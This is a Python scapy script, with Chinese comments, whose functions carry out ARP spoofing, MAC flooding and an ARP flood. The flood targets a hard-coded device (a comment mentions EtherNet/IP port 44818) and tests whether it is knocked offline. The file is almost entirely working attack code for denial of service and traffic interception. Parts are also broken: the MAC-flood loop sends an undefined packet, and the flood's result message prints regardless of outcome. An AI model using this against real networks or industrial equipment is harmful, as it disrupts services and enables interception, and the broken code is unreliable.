#!/usr/bin/env python3
#coding=utf-8
import random
import socket
from scapy.all import *
from scapy.layers.l2 import Ether, ARP, getmacbyip

# 构造arp欺骗包
def arpSpoof(targetIP, fakeIP):
    pkt = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=targetIP, psrc=fakeIP, hwsrc='ff:11:11:11:11:11')
    sendp(pkt)
    return

# arp欺骗
def arpTrick():
    # 欺骗主机
    targetIP = '192.168.211.148'
    # 仿造IP
    fakeIP = '192.168.153.2'
    while True:
        try:
            arpSpoof(targetIP, fakeIP)
        except KeyboardInterrupt:
            print("END ARP")
            break

# 生成随机的MAC
def randomMAC():
    # 利用scapy自带生成函数
    randmac = RandMAC("*:*:*:*:*:*")
    return randmac
 
# 生成随机的IP
def randomIP():
    ip=".".join(map(str,(random.randint(0,255) for i in range(4))))
    return ip

# Mac-flood
def macFlood():
    # count = int(input("Please input the number of packets："))
    count = 256
    total = 0
    print("Packets are sending ...")
    for i in range(count):
        # 指定目标mac地址与IP
        # packet = Ether(src=randomMAC(), dst=randomMAC()) / IP(src=randomIP(), dst=randomIP()) / ICMP()
        # 源目标mac地址与IP
        # packet = Ether(src=randomMAC(), dst=randomMAC()) / IP(src=randomIP(), dst=randomIP()) / ICMP()
        sendp(packet, iface='Intel(R) 82574L Gigabit Network Connection', loop=0)
        total +=1
        # 查看包头
        # print(packet.show())
    print("Total packets sent: %i" % total)


def checkAlive(targetIP, targetPort):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        sock.connect((targetIP, targetPort))
        sock.close()
    except Exception as err:
        print(err)
        return False
    return True

def getTargetMac(targetIP):
    targetMac = None
    for i in range(3):
        if not targetMac:
            targetMac = getmacbyip(targetIP)
        else:
            print("Target: %s MAC address is %s" % (targetIP, targetMac))
            # 返回目标mac值
            return targetMac
    print("Can't get Target:%s MAC address" % targetIP)
    return None

def arpAttack(dst_ip, dst_mac, src_ip, src_mac, iface):
    '''
    :param src_ip: Source ip address(arp.psrc).
    :param src_mac: Source mac address(arp.hwsrc).
    :param dst_ip: Destination ip address(arp.pdst).
    :param dst_mac: Destination mac address(arp.hwdst).
    :param iface: Interface to send packet.
    :param verbose: Verbose 0:close, 1: open.
    :return:
    '''
    arp = Ether() / ARP()
    arp.op = 2
    arp.pdst = dst_ip
    arp.hwdst = dst_mac
    arp.psrc = src_ip
    arp.hwsrc = src_mac
    sendp(arp, iface=iface)

def arpFlood():
    # ENBT port 44818
    targetIP = '192.168.0.11'
    targetPort = 80
    # 这里是虚拟机的网卡
    srcIface = 'Intel(R) 82574L Gigabit Network Connection'
    srcMac = 'ff:11:22:33:44:55'
    testTimes = 32
    netMask = 12
    if checkAlive(targetIP, targetPort):
        print("Target is alive")
        targetMac = getTargetMac(targetIP)
        if targetMac:
            for tt in range(testTimes):
                for i in range(netMask):
                    tempIP = targetIP.split('.')
                    srcIP = '.'.join(tempIP[:3])+'.'+str(i)
                    arpAttack(targetIP, targetMac, srcIP, srcMac, srcIface)
                time.sleep(0.1)
                if not checkAlive(targetIP, targetPort):
                    print("Target is down")
            print("Target not effect")
    else:
        print("target is down")

if __name__ == '__main__':
    print("#" * 30)
    arpFlood()